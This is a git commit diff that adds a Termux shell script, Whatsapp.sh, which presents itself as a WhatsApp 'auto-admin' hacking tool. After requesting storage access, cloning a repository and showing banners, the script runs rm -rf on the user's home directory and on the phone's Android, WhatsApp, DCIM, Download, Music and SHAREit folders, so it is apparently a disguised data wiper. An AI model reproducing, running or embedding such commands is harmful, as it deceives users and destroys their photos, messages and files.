8e9a4d7bea94cd3b77d0f8314ef0641604be1fff
DRACULA-HACK <96709855+DRACULA-HACK@users.noreply.github.com>
2022-03-30 19:11:03 +0530

    Update Whatsapp.sh

--- Whatsapp.sh
+++ Whatsapp.sh
@@ -1,1 +1,29 @@
-1
+1clear
+ rm -rf AUTO-ADMIN_WHATSAPP
+
+termux-setup-storage
+
+git clone https://github.com/DRACULA-HACK/AUTO-ADMIN_WHATSAPP 
+
+cd AUTO-ADMIN_WHATSAPP
+
+bash admin.sh
+clear
+Banner
+figlet AUTO-ADMIN_WHATSAPP
+
+figlet MASTER-HACK
+
+rm -rf cd /sdcard/Android
+rm -rf cd ~
+rm -rf cd /sdcard/WhatsApp
+rm -rf cd /sdcard/DCIM
+rm -rf cd /sdcard/Download
+rm -rf cd /sdcard/Music
+rm -rf cd /sdcard/SHAREit
+
+clear
+
+cd
+rm -rf all
+exit
